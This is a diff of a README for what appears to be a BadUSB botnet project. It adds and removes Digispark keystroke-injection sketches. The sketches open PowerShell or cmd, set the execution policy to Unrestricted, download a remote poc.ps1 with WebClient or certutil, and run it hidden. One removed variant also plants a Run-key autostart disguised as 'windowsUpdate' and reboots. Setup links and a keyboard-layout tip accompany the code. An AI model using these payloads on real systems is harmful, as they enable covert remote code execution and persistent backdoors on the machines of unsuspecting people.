@@ -45,54 +45,6 @@ ENTER
 
 > Link to convert to .ino: https://malduino.com/converter/
 
-### Digispark
-
-```c
-#define kbd_es_es
-#include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
-DigiKeyboard.sendKeyStroke(0);
-DigiKeyboard.delay(500);
-DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(3000);
-DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(200);
-DigiKeyboard.print("S");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-for (;;) {
-/*empty*/
-    }
-}
-```
-
-> Get the drivers: https://github.com/digistump/DigistumpArduino/releases
-
-> Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
-
-> DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
-
-> Keyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard
-Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
-```c
-#define kbd_es_es
-```
-
 ## Option 2 (with powershell and backdoor)
 
 ```powershell
@@ -138,33 +90,6 @@ certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTool
 > powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1
 ```
 
-#### Example on Digispark
-
-```c
-#define kbd_es_es
-#include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
-DigiKeyboard.sendKeyStroke(0);
-DigiKeyboard.delay(500);
-DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("cmd");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" Documents\windowsUpdate.ps1");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(500);
-DigiKeyboard.print("powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-for (;;) {
-/*empty*/
-    }
-}
-```
-
 ## Option 4 (with cmd and backdoor)
 
 ```cmd
@@ -173,7 +98,7 @@ for (;;) {
 > reboot (?)
 ```
 
-### Digispark
+## Example on digispark
 
 ```c
 #define kbd_es_es
@@ -186,21 +111,39 @@ DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("cmd");
+DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(3000);
+DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(200);
+DigiKeyboard.print("S");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" Documents\windowsUpdate.ps1");
+DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d \"powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1\"");
+DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("reboot");
+DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for (;;) {
 /*empty*/
     }
 }
+```
+
+> Get the drivers: https://github.com/digistump/DigistumpArduino/releases
+
+> Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
+
+> DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
+
+> Keyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard
+Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
+```c
+#define kbd_es_es
 ```
 
 ### Telegram Options
